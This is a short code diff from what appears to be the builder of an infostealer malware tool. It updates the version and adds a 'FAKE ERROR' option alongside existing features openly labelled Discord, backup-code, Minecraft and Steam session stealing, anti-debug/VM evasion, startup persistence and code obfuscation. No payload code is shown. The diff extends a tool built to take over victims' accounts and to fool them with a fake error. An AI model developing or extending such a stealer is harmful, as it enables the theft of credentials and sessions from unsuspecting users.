@@ -25,9 +25,9 @@ from utils.module.logger import log_debug, timestamp, log_warn, log_error
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=3)
 
-version = "v1.55.6"
-CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup"]
-ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup"]
+version = "v1.56.0"
+CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]
+ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
 PATH = "src/stealer_core/src.py"
 
 print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
